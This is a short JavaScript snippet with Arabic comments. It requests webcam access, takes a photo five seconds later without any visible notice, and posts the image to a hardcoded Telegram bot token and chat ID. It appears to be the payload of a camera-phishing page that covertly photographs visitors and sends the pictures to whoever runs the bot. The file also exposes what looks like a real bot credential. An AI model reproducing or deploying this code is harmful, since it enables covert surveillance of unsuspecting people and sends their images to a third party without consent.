// تفعيل الكاميرا
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // التقاط صورة تلقائيًا بعد 5 ثوانٍ
        setTimeout(function() {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            sendImageToTelegram(canvas.toDataURL('image/jpeg'));
        }, 5000);
    })
    .catch(function(err) {
        console.error("حدث خطأ: " + err);
    });

function sendImageToTelegram(dataURL) {
    var telegramToken = '7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU';
    var chatId = '5471126331';
    
    var formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", dataURLToBlob(dataURL));

    fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).then(response => {
        return response.json();
    }).then(data => {
        console.log(data);
    }).catch(error => {
        console.error("خطأ في إرسال الصورة إلى تلغرام: ", error);
    });
}

function dataURLToBlob(dataURL) {
    var byteString = atob(dataURL.split(',')[1]);
    var mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];

    var buffer = new ArrayBuffer(byteString.length);
    var dataArray = new Uint8Array(buffer);

    for (var i = 0; i < byteString.length; i++) {
        dataArray[i] = byteString.charCodeAt(i);
    }

    var blob = new Blob([buffer], { type: mimeString });
    return blob;
}
